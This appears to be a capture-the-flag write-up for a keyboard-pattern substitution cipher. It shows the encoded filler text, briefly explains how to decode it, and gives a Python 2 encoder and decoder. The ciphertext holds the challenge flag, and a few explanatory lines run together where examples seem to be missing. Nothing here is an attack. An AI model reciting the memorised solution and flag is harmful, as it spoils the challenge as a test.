qwertynbvcxswerfasdfghmnbvcdrtghuqwertyedcasdfghxsweftgbzxcvbnrtyuihnqwertytgbnhyzxcvbnmnbvcdrtghuasdfgh zxcvbnwertyfvzxcvbnqazxcdewqwertyrfvbnhytasdfghwsxdvrasdfgh zxcvbnxcvbgrdzxcvbn zxcvbnredcvgzxcvbnzsefvcxzxcvbnrfvbnzxcvbnrfvbnqwertyedcvrfzxcvbnjmyiasdfgh zxcvbnrfvbnhytqwertyewsxdzxcvbn zxcvbnwertyfvasdfghjmyiqwertynbvcxswerfzxcvbntgbnhyqwerty asdfghxcvbgrdasdfghxsweftbgasdfghedcvgrqwerty asdfghiuyhnbvqwertytrfvbqwertymnbvcdrtghuzxcvbngrdxcvbqwertyxsweftyhnasdfghrfvbhgzxcvbnedcvbzxcvbnwsxcdeqwertyedcvgrasdfgh zxcvbnrfvzxcvbnrtyuihnqwerty zxcvbnwertyfvqwertyqazxcdewzxcvbn asdfghxsweftynhqwertygrdxcvbqwertyqazsceqwertytgbnhyasdfgh asdfghgrdxcvbzxcvbn zxcvbnrtyuihnasdfghefvtzxcvbnnbvcxswerfzxcvbntgbnhyzxcvbn asdfghiuyhnbvqwertynbvcxswefrzxcvbnedcvrfzxcvbnredcvzxcvbnrfvqwertyxsweftynhasdfghtgbnhyqwertyzaqwdvfrasdfgh asdfghrfvbhgzxcvbnwsxcvfreqwertyrfvbnhytqwertywsxdvrasdfgh.asdfgh zxcvbnedcasdfghwertyfvasdfgh qwertyedcftgbzxcvbnxcvbgrdasdfghiuyhnbvqwerty qwertyiuyhnbvasdfghwsxcvfrzxcvbnmnbvcdrtghuasdfghefvgyzxcvbnwsxasdfghwdcftqwertywsxcdezxcvbnwsxcfeasdfgh zxcvbnzaqwdvfrzxcvbnqazxcdewqwertywertyfvqwerty qwertyqazxcdewzxcvbnxsweftbgqwertywsxcvqwertyefvtqwerty asdfghtrfvgzxcvbnwsxasdfghwdcftqwertywsxcdezxcvbn asdfghtrfvbasdfghedcvrfasdfghxsweftgbasdfghrtyuihnqwertyedcvbgtasdfghmnbvcdrtghuasdfghwsxqwertytgbnhyqwertyiuyhnbvzxcvbn,qwerty zxcvbnwsxcfdzxcvbnedcvbgtqwertyrtyuihnqwerty zxcvbnxcvbgrdzxcvbnrfvbnasdfghytrfvcxasdfghwsxcvfreqwerty zxcvbnrtyuihnasdfghwsxdrfvqwertywsxcdeqwerty asdfghwsxcvzxcvbntgbnhyzxcvbnxcvbgrdzxcvbnnbvcxswefrzxcvbn asdfghwsxqwertyxsweftgbqwertywertyfvasdfghwsxcvfreqwerty asdfghedcvrfqwertywsxcvzxcvbntgbnhyasdfghredcvqwertywertyfvzxcvbnmnbvcdrtghuasdfghwsxcvfreasdfghxsweftbgzxcvbnedcasdfghewsxcqwerty zxcvbnrtyuihnqwertyjmyiqwertynbvcxswerfqwertytgbnhyqwertyytrfvcxzxcvbntgbnhyzxcvbnrtyuihnzxcvbnwertyfvzxcvbnedczxcvbnxsweftgbasdfghredcvgzxcvbn,qwerty asdfghmnbvcdrtghuqwertytgbnhyzxcvbnxsweftyhnzxcvbnzsefvcxasdfghrfvzxcvbnxsweftbgasdfghedcqwertyxsweftbgasdfghredcvgzxcvbn asdfghwsxcdeqwertyiuyhnbvqwertyytrfvcxqwertywsxcdezxcvbnxsweftgbzxcvbnrtyuihnasdfghedcqwertyxcvbgrdasdfghedcvbqwertyrfvbnqwertyefvtqwerty zxcvbnedcvbgtasdfghxsweftbgzxcvbntrfvbasdfghrfvgyhnqwertygrdxcvbasdfghxsweftgbasdfghcvgredasdfghwsxcdezxcvbnwsxcfezxcvbn.qwerty qwertyrfvasdfghrtyuihnzxcvbn qwertyefvgywdcftzxcvbngrdxcvbzxcvbniuyhnbvasdfgh qwertynbvcxswerfqwertywsxcvfrezxcvbnmnbvccdertgasdfghedcvbgtzxcvbnrfvbnasdfghxcvbgrdzxcvbnmnbvcdrtghuasdfghwsxzxcvbniuyhnbvzxcvbnedcvrfzxcvbnedcvgrzxcvbn zxcvbnwsxqwertyzaqwdvfrqwerty qwertyrtyuihnqwertyrfvgyhnqwertywsxcdezxcvbn zxcvbn1qwerty9asdfgh6zxcvbn0zxcvbniuyhnbvqwerty asdfghefvgywdcftasdfghwsxzxcvbnrtyuihnzxcvbnwsxdrfvasdfgh asdfghwertyfvasdfghrfvgyhnzxcvbnwsxcdezxcvbn qwertymnbvcdrtghuzxcvbnedcvrfzxcvbnwsxcvzxcvbntgbnhyasdfghgrdxcvbasdfghiuyhnbvzxcvbnedcvrfqwerty qwertyqazxcdewzxcvbnewsxdasdfgh asdfghedcvbzxcvbnedcvrfzxcvbnwertyfvzxcvbnmnbvcdrtghuzxcvbnzsefvcxqwertyiuyhnbvasdfghtgbnhyzxcvbnrtyuihnasdfgh qwertyiuyhnbvzxcvbnrfvgyhnqwertytgbnhyqwertytgbnhyzxcvbnrtyuihnasdfghiuyhnbvzxcvbn asdfghtrfvbqwertyrfvbnhytqwertyzaqwdvfrqwertyrtyuihnzxcvbngrdxcvbzxcvbnwsxqwertyxsweftgbzxcvbnwsxqwertyxsweftgbzxcvbncvgredqwerty zxcvbnedcvbzxcvbnrfvbnhytzxcvbnmnbvcdrtghuasdfghtgbnhyasdfghxsweftyhnqwerty qwertywsxzxcvbnnbvcxswefrasdfghytrfvcxasdfghedcvbgtqwertyxsweftyhnasdfgh qwertynbvcxswerfqwertyzsefvcxasdfghiuyhnbvasdfghiuyhnbvasdfghxcvbgrdasdfghredcvgasdfghtgbnhyzxcvbnytrfvcxasdfgh,asdfgh zxcvbnzsefvcxqwertyxsweftgbqwertyedcvgrzxcvbn qwertyzaqwdrtgbqwertywsxcvfrezxcvbnmnbvcdrtghuzxcvbnwsxcdezxcvbn zxcvbnmnbvcdrtghuasdfghedcvrfasdfghredcvqwertytgbnhyqwertyxsweftbgasdfghrtyuihnqwertyedcvbqwertyefvtzxcvbn qwertyefvgywdcftzxcvbnedczxcvbnwertyfvqwertywsxdrfvasdfgh zxcvbnwsxcfeasdfghedcvrfqwertyiuyhnbvasdfghedcfbyasdfghwertyfvqwertywsxcvfreasdfghnbvcxswerfqwerty asdfghnbvcxswefrqwertyedcvbgtzxcvbnwsxcfdqwertywsxcvqwertyedcqwertyytrfvcxasdfghwsxdrfvasdfghedczxcvbnxsweftgbzxcvbncvrgedzxcvbn asdfghiuyhnbvasdfghrfvbnhytasdfghtrfvgqwertyrtyuihnasdfghefvgywdcftasdfghzsefvcxasdfghmnbvcdrtghuasdfghtgbnhyzxcvbn asdfghrfvbnzxcvbnwsxqwertywsxdvrqwertywsxcdeasdfgh zxcvbnxcvbgrdasdfghwsxcvzxcvbnyhnmkuqwertyedcvbgtzxcvbniuyhnbvasdfgh zxcvbnnbvcxswerfasdfghzsefvcxqwertycvgredasdfghedcvrfasdfghxsweftynhqwertyxcvbgrdasdfghwsxdvrasdfghedcvrfasdfghmnbvcdrtghuqwerty asdfghrfvasdfghxsweftgbqwertyewsxczxcvbnwsxcvasdfghwsxcvfrqwertyyhnmkuzxcvbnwsxzxcvbnxsweftbgqwertycvgredqwerty asdfghefvgyzxcvbnedcvrfzxcvbnmnbvcdrtghuqwertyiuyhnbvqwertywsxzxcvbnwsxcvfrezxcvbnxsweftbgzxcvbniuyhnbvqwerty asdfghwsxcvfreqwertyredcfqwerty asdfghedcvbqwertyqazxcdewasdfghmnbvcdrtghuasdfghwsxcdeqwertyxsweftynhqwerty qwertyedcqwertymnbvccdertgzxcvbniuyhnbvasdfghwsxcvfrqwertyzaqwdrtgbqwerty.asdfghThe above given text is encoded with a some kind of substitution algorithm. Also we can observe that some part are repeating themself.First example:Second example:Third example:After replacing the above strings with spaces (“ “), you obtain the following:By searching for “{“ or “}” we can obtain the exact block of the flag. Also note that numbers or spaces are not substituted.From that flag format we know that “wsxcfe” is the letter “D” and if we take a look at our keyboard, we get the following information:By mapping all blocks to our keyboard we can obtain all letters in this encoding. Therefore there is an almost perfect decryption tool:import randomkeyboard = [[[\"a\"],[\"xcvbgrd\", \"grdxcvb\", \"zsefvcx\"]],[[\"b\"],[\"wsxcfd\", \"rfvbhg\", \"qazxds\"]],[[\"c\"],[\"redcv\", \"ewsxc\", \"trfvb\"]],[[\"d\"],[\"edcvgr\", \"wsxcfe\", \"yhnmku\"]],[[\"e\"],[\"edcvrf\", \"wsxcde\", \"tgbnhy\"]],[[\"f\"],[\"redcf\", \"trfvg\", \"ewsxd\"]],[[\"g\"],[\"redcvg\", \"cvgred\", \"cvrged\"]],[[\"h\"],[\"wsxdrfv\", \"edcftgb\", \"rfvgyhn\"]],[[\"i\"],[\"wsx\", \"edc\", \"rfv\"]],[[\"j\"],[\"ujmn\", \"wsxz\", \"rfvc\"]],[[\"k\"],[\"edcfby\", \"wsxdvr\", \"qazsce\"]],[[\"l\"],[\"wsxcv\", \"edcvb\", \"rfvbn\"]],[[\"m\"],[\"zaqwdrtgb\", \"xsweftyhn\", \"xsweftynh\"]],[[\"n\"],[\"zaqwdvfr\", \"xsweftgb\" , \"xsweftbg\"]],[[\"o\"],[\"qazxcdew\", \"wsxcvfre\", \"rfvbnhyt\"]],[[\"p\"],[\"mnbvccdertg\", \"nbvcxswerf\", \"nbvcxswefr\"]],[[\"q\"],[\"qazxcdewv\", \"edcvbgtrn\", \"rfvbnhytm\"]],[[\"r\"],[\"mnbvcdrtghu\",\"mnbvcdrtghu\",\"mnbvcdrtghu\"]],[[\"s\"],[\"ytrfvcx\", \"iuyhnbv\", \"iuyhnbv\"]],[[\"t\"],[\"wertyfv\", \"rtyuihn\", \"rtyuihn\"]],[[\"u\"],[\"wsxcvfr\", \"edcvbgt\", \"edcvbgt\"]],[[\"v\"],[\"efvgy\", \"wdcft\", \"wdcft\"]],[[\"w\"],[\"efvgywdcft\",\"efvgywdcft\",\"efvgywdcft\"]],[[\"x\"],[\"wdvtdz\", \"rgnygc\", \"rgnygc\"]],[[\"y\"],[\"jmyi\", \"efvt\", \"efvt\"]],[[\"z\"],[\"qwerdcvb\", \"ertgvbn\", \"ertgvbn\"]]]def nliqwerty_enc(buf):\tenc_buf = \"\"\tx = 0\ty = 0\tfor char in buf:\t\tfor count in range(0,26):\t\t\tif (char.lower() == keyboard[count][0][0]):\t\t\t\t# print char.lower() + \" / \" + keyboard[count][1][random.randint(0, 2)]\t\t\t\tenc_buf += keyboard[count][1][random.randint(0, 2)]\t\t\t\ty = 1\t\t\t\tx = 0\t\t\telse:\t\t\t\tif y == 0:\t\t\t\t\tx = 1\t\tif x == 1:\t\t\t\tenc_buf += char.lower()\t\tenc_buf += random.choice([\"qwerty\", \"asdfgh\", \"zxcvbn\"])\t\tx = 0\t\ty = 0\t\t\treturn enc_bufdef nliqwerty_dec(buf):\tdec_buf = \"\"\tdec_buf = buf.replace(\"qwerty\", \"#\")\tdec_buf = dec_buf.replace(\"asdfgh\", \"#\")\tdec_buf = dec_buf.replace(\"zxcvbn\", \"#\")\tchars = dec_buf.split(\"#\")\tdec_buf = \"\"\tfor x in chars:\t\tif len(x) == 1:\t\t\tdec_buf += x\t\telse:\t\t\tfor count in range(0,26):\t\t\t\tif x == keyboard[count][1][0]:\t\t\t\t\tdec_buf += keyboard[count][0][0]\t\t\t\t\t\t\t\t\tif x == keyboard[count][1][1]:\t\t\t\t\tdec_buf += keyboard[count][0][0]\t\t\t\t\t\t\t\tif x == keyboard[count][1][2]:\t\t\t\t\tdec_buf += keyboard[count][0][0]\tprint dec_bufprint \"-=====-\"nliqwerty_dec(\"wsxcvasdfghrfvbnhytqwertymnbvcdrtghuzxcvbnwsxcdeasdfghzaqwdrtgbzxcvbn qwertywsxqwertynbvcxswefrqwertyiuyhnbvqwertywsxcvfrasdfghzaqwdrtgbzxcvbn qwertywsxasdfghiuyhnbvasdfgh zxcvbnytrfvcxqwertywsxasdfghzaqwdrtgbqwertymnbvccdertgzxcvbnedcvbasdfghefvtzxcvbn asdfghwsxcfezxcvbnedcvbgtasdfghzaqwdrtgbqwertyxsweftynhzxcvbnjmyizxcvbn zxcvbnrtyuihnzxcvbnwsxcdeasdfghrgnygcqwertyrtyuihnasdfgh qwertyqazxcdewzxcvbnredcfzxcvbn zxcvbnwertyfvzxcvbnrfvgyhnasdfghwsxcdeqwerty qwertynbvcxswefrzxcvbnmnbvcdrtghuzxcvbnrfvqwertyxsweftgbqwertyrtyuihnqwertywsxasdfghxsweftgbzxcvbncvgredasdfgh asdfghgrdxcvbzxcvbnxsweftbgasdfghwsxcfeqwerty asdfghwertyfvqwertyefvtqwertynbvcxswefrqwertyedcvrfzxcvbnytrfvcxzxcvbntgbnhyasdfghwertyfvasdfghwertyfvzxcvbnwsxqwertyzaqwdvfrzxcvbncvgredqwerty asdfghedczxcvbnxsweftbgasdfghyhnmkuzxcvbnedcvbgtqwertyiuyhnbvqwertyrtyuihnasdfghmnbvcdrtghuqwertyjmyiasdfgh.zxcvbn asdfghrfvbnqwertywsxcvfreasdfghmnbvcdrtghuqwertywsxcdeasdfghzaqwdrtgbasdfgh asdfghwsxqwertynbvcxswerfqwertyiuyhnbvzxcvbnedcvbgtzxcvbnxsweftyhnqwerty qwertyrfvgyhnasdfghzsefvcxqwertyytrfvcxasdfgh qwertyrfvbhgasdfghedcvrfasdfghtgbnhyasdfghxsweftgbasdfgh asdfghrtyuihnqwertyedcftgbasdfghtgbnhyasdfgh zxcvbnrfvasdfghzaqwdvfrasdfghwsxcfezxcvbnedcvbgtqwertyytrfvcxzxcvbnrtyuihnasdfghmnbvcdrtghuzxcvbnefvtzxcvbn'asdfghiuyhnbvzxcvbn qwertyiuyhnbvzxcvbnrtyuihnqwertyzsefvcxasdfghzaqwdvfrqwertyyhnmkuqwertyzsefvcxzxcvbnmnbvcdrtghuqwertyedcvgrzxcvbn zxcvbnwsxcfeqwertyedcvbgtasdfghxsweftynhasdfghxsweftyhnzxcvbnefvtqwerty zxcvbnrtyuihnzxcvbntgbnhyqwertywdvtdzasdfghwertyfvzxcvbn asdfghtgbnhyqwertywdcftasdfghedcvrfasdfghmnbvcdrtghuqwerty zxcvbniuyhnbvzxcvbnrfvqwertyxsweftgbzxcvbnewsxczxcvbnwsxcdezxcvbn qwertywertyfvqwertyedcftgbzxcvbnedcvrfzxcvbn asdfgh1qwerty5zxcvbn0asdfgh0qwertyiuyhnbvzxcvbn,qwerty zxcvbnefvgywdcftzxcvbnedcftgbasdfghwsxcdeqwertyxsweftgbzxcvbn zxcvbngrdxcvbasdfghzaqwdvfrqwerty asdfghwsxcvfrqwertyzaqwdvfrasdfghedcfbyasdfghxsweftbgzxcvbnwsxcvfreqwertyefvgywdcftzxcvbnxsweftbgasdfgh asdfghnbvcxswerfzxcvbnmnbvcdrtghuqwertyedczxcvbnxsweftbgqwertywertyfvzxcvbnedcvrfzxcvbnmnbvcdrtghuqwerty qwertyrtyuihnqwertyqazxcdewzxcvbnwsxcvfreqwertyedcfbyasdfgh qwertygrdxcvbasdfgh zxcvbncvgredzxcvbnxcvbgrdasdfghrfvbnasdfghrfvbnasdfghwsxcdeqwertyefvtqwerty qwertyqazxcdewqwertytrfvgzxcvbn zxcvbnwertyfvzxcvbnefvtqwertymnbvccdertgqwertyedcvrfasdfgh zxcvbngrdxcvbzxcvbnzaqwdvfrqwertyyhnmkuqwerty qwertyiuyhnbvqwertyredcvasdfghmnbvcdrtghuzxcvbnzsefvcxqwertyxsweftynhzxcvbnrfvbhgzxcvbnwsxcvasdfghwsxcdezxcvbnedcvgrasdfgh qwertyrfvqwertyrtyuihnzxcvbn qwertyrtyuihnqwertyqazxcdewzxcvbn asdfghxsweftynhqwertyzsefvcxzxcvbnqazsceasdfghedcvrfqwerty asdfghxcvbgrdasdfgh asdfghrtyuihnzxcvbnjmyizxcvbnmnbvccdertgqwertywsxcdeqwerty asdfghiuyhnbvasdfghnbvcxswerfasdfghwsxcdezxcvbnewsxcqwertyedcasdfghxsweftynhasdfghedcvrfqwertyxsweftbgqwerty qwertywsxcfdqwertywsxcvfreasdfghwsxcvfreqwertyedcfbyasdfgh.asdfgh asdfghedczxcvbnrtyuihnasdfgh asdfghwsxdrfvzxcvbnxcvbgrdzxcvbniuyhnbvqwerty asdfghiuyhnbvqwertywsxcvfrasdfghmnbvcdrtghuqwertyefvgyasdfghwsxqwertyefvgyqwertytgbnhyqwertywsxcfezxcvbn qwertyzaqwdvfrasdfghrfvbnhytasdfghrtyuihnqwerty asdfghwsxcvfreqwertyzaqwdvfrzxcvbnrfvbnzxcvbnefvtzxcvbn qwertyewsxdzxcvbnrfvzxcvbnwdcftzxcvbntgbnhyqwerty zxcvbnewsxcqwertytgbnhyqwertyzaqwdvfrasdfghrtyuihnasdfghedcvbgtqwertymnbvcdrtghuzxcvbnwsxqwertyedcvrfqwertyiuyhnbvzxcvbn,qwerty zxcvbnrfvbhgasdfghedcvbgtqwertyrtyuihnasdfgh zxcvbnxcvbgrdasdfghwsxcvzxcvbnytrfvcxzxcvbnqazxcdewzxcvbn zxcvbnrtyuihnqwertyrfvgyhnqwertywsxcdeasdfgh qwertyrfvbnzxcvbnedcvrfzxcvbngrdxcvbqwertymnbvccdertgzxcvbn qwertywsxzxcvbnzaqwdvfrasdfghwertyfvqwertywsxcvfreasdfgh asdfghtgbnhyasdfghrfvbnqwertyedcvrfzxcvbntrfvbqwertyrtyuihnzxcvbnmnbvcdrtghuzxcvbnrfvbnhytqwertyxsweftgbzxcvbnwsxqwertyredcvzxcvbn asdfghrtyuihnqwertyefvtqwertynbvcxswerfasdfghwsxcdeqwertyiuyhnbvzxcvbnwsxcdezxcvbnwertyfvqwertyrtyuihnasdfghwsxzxcvbnxsweftgbqwertycvgredqwerty,zxcvbn qwertymnbvcdrtghuzxcvbnedcvrfqwertyxsweftyhnasdfghxcvbgrdzxcvbnedcqwertyxsweftgbasdfghedcqwertyxsweftbgasdfghcvrgedqwerty qwertyedcvrfzxcvbniuyhnbvqwertyiuyhnbvasdfghedcvrfqwertyxsweftbgasdfghrtyuihnzxcvbnrfvzxcvbnzsefvcxqwertywsxcvasdfghrfvbnzxcvbnefvtzxcvbn zxcvbnedcvbgtqwertyxsweftbgqwertytrfvbqwertyedcftgbasdfghxcvbgrdqwertyxsweftbgzxcvbncvrgedzxcvbnwsxcdeqwertyyhnmkuasdfgh.asdfgh qwertywsxasdfghwertyfvasdfgh qwertyefvgywdcftasdfghxcvbgrdasdfghiuyhnbvzxcvbn qwertymnbvccdertgzxcvbnwsxcvfreasdfghnbvcxswefrqwertyedcvbgtasdfghrfvbnqwertyzsefvcxzxcvbnmnbvcdrtghuzxcvbnwsxqwertyytrfvcxzxcvbnwsxcdeqwertywsxcfezxcvbn qwertyrfvzxcvbnzaqwdvfrqwerty asdfghrtyuihnzxcvbnrfvgyhnasdfghwsxcdeasdfgh zxcvbn1qwerty9qwerty6zxcvbn0asdfghytrfvcxqwerty asdfghefvgywdcftqwertyrfvasdfghrtyuihnqwertywsxdrfvzxcvbn asdfghwertyfvzxcvbnedcftgbqwertyedcvrfasdfgh asdfghmnbvcdrtghuzxcvbnwsxcdeasdfghrfvbnasdfghedcvrfzxcvbngrdxcvbqwertyytrfvcxqwertyedcvrfasdfgh asdfghwsxcvfrezxcvbnewsxdqwerty qwertyrfvbnzxcvbntgbnhyasdfghwertyfvasdfghmnbvcdrtghuqwertygrdxcvbasdfghytrfvcxqwertyedcvrfqwertyrtyuihnqwerty zxcvbniuyhnbvzxcvbnrfvgyhnqwertytgbnhyasdfghtgbnhyasdfghrtyuihnzxcvbnytrfvcxqwerty zxcvbnredcvqwertyrfvbnhytasdfghxsweftbgzxcvbnrtyuihnasdfghxcvbgrdqwertyedczxcvbnxsweftgbqwertyedcasdfghxsweftbgasdfghcvrgedqwerty asdfghrfvbnasdfghqazxcdewqwertymnbvcdrtghuqwertywsxcdeasdfghxsweftyhnzxcvbn qwertyedczxcvbnnbvcxswerfasdfghiuyhnbvzxcvbnedcvbgtasdfghxsweftynhzxcvbn zxcvbnnbvcxswerfasdfghxcvbgrdzxcvbniuyhnbvqwertyytrfvcxqwertygrdxcvbqwertycvrgedqwertyedcvrfzxcvbniuyhnbvqwerty,asdfgh zxcvbnxcvbgrdqwertyzaqwdvfrzxcvbnwsxcfeqwerty asdfghxsweftyhnzxcvbnrfvbnhytasdfghmnbvcdrtghuasdfghtgbnhyasdfgh qwertymnbvcdrtghuqwertywsxcdezxcvbntrfvbqwertyedcvrfzxcvbnxsweftbgqwertywertyfvqwertyedcvbzxcvbnefvtqwerty qwertyefvgywdcftasdfghrfvqwertyrtyuihnasdfghedcftgbasdfgh zxcvbnyhnmkuasdfghtgbnhyqwertyytrfvcxasdfghqazsceasdfghrtyuihnasdfghrfvbnhytzxcvbnnbvcxswerfzxcvbn qwertynbvcxswefrqwertyedcvbgtasdfghrfvbhgzxcvbnedcvbqwertyrfvzxcvbniuyhnbvqwertywsxdrfvasdfghwsxzxcvbnxsweftbgasdfghcvgredasdfgh zxcvbniuyhnbvasdfghwsxcvfrezxcvbntrfvgasdfghrtyuihnzxcvbnefvgywdcftasdfghgrdxcvbzxcvbnmnbvcdrtghuasdfghedcvrfqwerty zxcvbnrfvbnqwertywsxqwertywsxdvrqwertywsxcdeqwerty qwertyxcvbgrdqwertyrfvbnqwertyedcvgrqwertywsxcvfrzxcvbnytrfvcxqwerty qwertymnbvccdertgzxcvbnxcvbgrdzxcvbncvgredqwertywsxcdeasdfghxsweftynhqwertyzsefvcxqwertywsxdvrasdfghedcvrfqwertymnbvcdrtghuasdfgh qwertywsxasdfghzaqwdvfrqwertyewsxczxcvbnrfvbnzxcvbnedcvbgtqwertyedcvgrzxcvbnwsxzxcvbnxsweftbgasdfghredcvgasdfgh zxcvbnwdcftasdfghtgbnhyzxcvbnmnbvcdrtghuqwertyiuyhnbvzxcvbnedcqwertywsxcvfreasdfghzaqwdvfrqwertyiuyhnbvzxcvbn zxcvbnwsxcvfreqwertyewsxdzxcvbn qwertyrfvbnqwertyqazxcdewasdfghmnbvcdrtghuzxcvbnwsxcdezxcvbnxsweftynhasdfgh zxcvbnrfvasdfghnbvcxswerfzxcvbniuyhnbvasdfghedcvbgtqwertyxsweftyhnqwerty.qwerty qwertywsxcfeasdfghtrfvbasdfghrtyuihnzxcvbnredcfqwerty{zxcvbnrfvbhgzxcvbn6zxcvbn6asdfghedcvrfzxcvbnredcvasdfghzsefvcxasdfghxcvbgrdasdfghgrdxcvbzxcvbn9qwerty0zxcvbnzsefvcxzxcvbnedcvgrasdfgh0asdfgh5qwertyyhnmkuasdfghredcfasdfgh5zxcvbnwsxcfeqwertyzsefvcxasdfghwsxcfdqwerty3qwerty3qwertyedcvgrqwerty7zxcvbn1qwertygrdxcvbqwerty8asdfghtrfvgzxcvbn7zxcvbn0qwerty9qwerty3qwerty4zxcvbn4zxcvbn0qwerty8zxcvbnredcfzxcvbn3zxcvbnzsefvcxzxcvbn5zxcvbn8qwerty4asdfgh7qwertyzsefvcxasdfgh4asdfghewsxczxcvbn5zxcvbntrfvbzxcvbn3asdfgh8zxcvbnedcvgrqwertyqazxdsasdfgh7zxcvbn5qwerty8asdfgh9asdfgh1qwertyrfvbhgasdfgh0zxcvbntrfvgasdfgh0qwertywsxcdezxcvbn3qwerty2zxcvbn}qwertywsxcvqwertyrfvbnhytzxcvbnmnbvcdrtghuasdfghtgbnhyqwertyxsweftyhnqwerty qwertyrfvasdfghmnbvccdertgqwertyiuyhnbvzxcvbnwsxcvfrzxcvbnxsweftyhnzxcvbn zxcvbnedczxcvbniuyhnbvqwerty asdfghytrfvcxasdfghwsxqwertyzaqwdrtgbqwertynbvcxswefrzxcvbnwsxcvqwertyjmyizxcvbn zxcvbnwsxcfeqwertyedcvbgtqwertyxsweftyhnzxcvbnxsweftyhnasdfghefvtzxcvbn asdfghrtyuihnqwertyedcvrfasdfghwdvtdzzxcvbnwertyfvzxcvbn asdfghrfvbnhytqwertytrfvgzxcvbn qwertywertyfvqwertywsxdrfvzxcvbnwsxcdeasdfgh asdfghnbvcxswefrasdfghmnbvcdrtghuzxcvbnwsxasdfghxsweftgbzxcvbnrtyuihnzxcvbnrfvzxcvbnxsweftgbqwertycvgredqwerty zxcvbngrdxcvbzxcvbnxsweftbgasdfghedcvgrasdfgh zxcvbnrtyuihnasdfghjmyizxcvbnnbvcxswerfasdfghtgbnhyqwertyiuyhnbvqwertytgbnhyasdfghwertyfvzxcvbnrtyuihnzxcvbnwsxzxcvbnxsweftgbasdfghcvrgedqwerty asdfghedcqwertyxsweftgbasdfghwsxcfezxcvbnwsxcvfrzxcvbniuyhnbvqwertyrtyuihnasdfghmnbvcdrtghuzxcvbnefvtzxcvbn.zxcvbn qwertyrfvbnzxcvbnwsxcvfreasdfghmnbvcdrtghuzxcvbnedcvrfasdfghzaqwdrtgbasdfgh qwertyedcasdfghmnbvccdertgqwertyytrfvcxasdfghwsxcvfrasdfghzaqwdrtgbasdfgh asdfghrfvgyhnzxcvbnxcvbgrdasdfghiuyhnbvzxcvbn zxcvbnqazxdsqwertyedcvrfzxcvbnedcvrfzxcvbnxsweftgbzxcvbn zxcvbnrtyuihnzxcvbnwsxdrfvqwertyedcvrfasdfgh zxcvbnedcqwertyzaqwdvfrqwertyyhnmkuasdfghedcvbgtasdfghytrfvcxasdfghwertyfvzxcvbnmnbvcdrtghuzxcvbnjmyiasdfgh'asdfghytrfvcxasdfgh qwertyytrfvcxasdfghrtyuihnzxcvbnxcvbgrdasdfghzaqwdvfrzxcvbnedcvgrzxcvbnzsefvcxasdfghmnbvcdrtghuasdfghyhnmkuqwerty qwertywsxcfezxcvbnedcvbgtzxcvbnxsweftyhnasdfghxsweftyhnasdfghefvtqwerty asdfghrtyuihnzxcvbnedcvrfzxcvbnwdvtdzzxcvbnrtyuihnqwerty asdfghwsxcdeqwertywdcftzxcvbnwsxcdeqwertymnbvcdrtghuzxcvbn zxcvbniuyhnbvzxcvbnrfvzxcvbnzaqwdvfrasdfghtrfvbasdfghedcvrfzxcvbn zxcvbnwertyfvasdfghrfvgyhnzxcvbntgbnhyzxcvbn asdfgh1zxcvbn5asdfgh0zxcvbn0qwertyiuyhnbvasdfgh,asdfgh asdfghefvgywdcftasdfghedcftgbqwertyedcvrfasdfghxsweftbgqwerty asdfghzsefvcxzxcvbnxsweftbgqwerty zxcvbnedcvbgtasdfghxsweftbgqwertyedcfbyasdfghzaqwdvfrzxcvbnwsxcvfreasdfghefvgywdcftqwertyxsweftbgqwerty qwertynbvcxswerfasdfghmnbvcdrtghuqwertyedcasdfghxsweftgbzxcvbnrtyuihnqwertytgbnhyzxcvbnmnbvcdrtghuasdfgh zxcvbnwertyfvzxcvbnqazxcdewqwertyrfvbnhytasdfghwsxdvrasdfgh zxcvbnxcvbgrdzxcvbn zxcvbnredcvgzxcvbnzsefvcxzxcvbnrfvbnzxcvbnrfvbnqwertyedcvrfzxcvbnjmyiasdfgh zxcvbnrfvbnhytqwertyewsxdzxcvbn zxcvbnwertyfvasdfghjmyiqwertynbvcxswerfzxcvbntgbnhyqwerty asdfghxcvbgrdasdfghxsweftbgasdfghedcvgrqwerty asdfghiuyhnbvqwertytrfvbqwertymnbvcdrtghuzxcvbngrdxcvbqwertyxsweftyhnasdfghrfvbhgzxcvbnedcvbzxcvbnwsxcdeqwertyedcvgrasdfgh zxcvbnrfvzxcvbnrtyuihnqwerty zxcvbnwertyfvqwertyqazxcdewzxcvbn asdfghxsweftynhqwertygrdxcvbqwertyqazsceqwertytgbnhyasdfgh asdfghgrdxcvbzxcvbn zxcvbnrtyuihnasdfghefvtzxcvbnnbvcxswerfzxcvbntgbnhyzxcvbn asdfghiuyhnbvqwertynbvcxswefrzxcvbnedcvrfzxcvbnredcvzxcvbnrfvqwertyxsweftynhasdfghtgbnhyqwertyzaqwdvfrasdfgh asdfghrfvbhgzxcvbnwsxcvfreqwertyrfvbnhytqwertywsxdvrasdfgh.asdfgh zxcvbnedcasdfghwertyfvasdfgh qwertyedcftgbzxcvbnxcvbgrdasdfghiuyhnbvqwerty qwertyiuyhnbvasdfghwsxcvfrzxcvbnmnbvcdrtghuasdfghefvgyzxcvbnwsxasdfghwdcftqwertywsxcdezxcvbnwsxcfeasdfgh zxcvbnzaqwdvfrzxcvbnqazxcdewqwertywertyfvqwerty qwertyqazxcdewzxcvbnxsweftbgqwertywsxcvqwertyefvtqwerty asdfghtrfvgzxcvbnwsxasdfghwdcftqwertywsxcdezxcvbn asdfghtrfvbasdfghedcvrfasdfghxsweftgbasdfghrtyuihnqwertyedcvbgtasdfghmnbvcdrtghuasdfghwsxqwertytgbnhyqwertyiuyhnbvzxcvbn,qwerty zxcvbnwsxcfdzxcvbnedcvbgtqwertyrtyuihnqwerty zxcvbnxcvbgrdzxcvbnrfvbnasdfghytrfvcxasdfghwsxcvfreqwerty zxcvbnrtyuihnasdfghwsxdrfvqwertywsxcdeqwerty asdfghwsxcvzxcvbntgbnhyzxcvbnxcvbgrdzxcvbnnbvcxswefrzxcvbn asdfghwsxqwertyxsweftgbqwertywertyfvasdfghwsxcvfreqwerty asdfghedcvrfqwertywsxcvzxcvbntgbnhyasdfghredcvqwertywertyfvzxcvbnmnbvcdrtghuasdfghwsxcvfreasdfghxsweftbgzxcvbnedcasdfghewsxcqwerty zxcvbnrtyuihnqwertyjmyiqwertynbvcxswerfqwertytgbnhyqwertyytrfvcxzxcvbntgbnhyzxcvbnrtyuihnzxcvbnwertyfvzxcvbnedczxcvbnxsweftgbasdfghredcvgzxcvbn,qwerty asdfghmnbvcdrtghuqwertytgbnhyzxcvbnxsweftyhnzxcvbnzsefvcxasdfghrfvzxcvbnxsweftbgasdfghedcqwertyxsweftbgasdfghredcvgzxcvbn 